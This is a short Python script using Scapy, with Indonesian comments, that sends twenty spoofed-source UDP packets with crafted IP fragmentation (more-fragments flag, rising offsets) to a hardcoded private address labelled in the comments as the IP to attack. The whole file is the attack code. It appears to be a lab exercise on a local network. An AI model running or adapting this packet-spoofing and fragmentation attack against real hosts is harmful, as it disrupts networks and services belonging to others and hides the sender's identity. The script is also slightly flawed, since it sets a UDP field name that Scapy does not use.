from scapy.all import *
target_IP = "192.168.8.175" #ip yang akan diserang
i = 1 #inisiasi untuk perulangan
fragment=0 #inisiasi fragment
while True:
	d = str(random.randint(1,150))
	dot = "."

	source_IP = "192" + dot + "168" + dot + "8" + dot + d #random_ip_address for attack
	ip = IP(src = source_IP, dst = target_IP,id = 17, frag=fragment, flags = 1) #Pembuatan ip header dengan flags 1

	udp = UDP(sport = 7070, dport = 9090, len= 18)#Port yang diserang

	payload = 'A' * 10#Data yang dikirim

	pkt = ip/udp/payload #pembuatan paket
	pkt[UDP].checksum = 0 #agar tidak di cek
	send(pkt,verbose=0)#Pengiriman paket
	print("packet sent", i)
	i = i + 1
	fragment = fragment + 10 #Setiap mengirim fragment akan bertambah 10 sesuai banyaknya payload
	if(i==21):
		print("STOP SEND PACKET")
		break
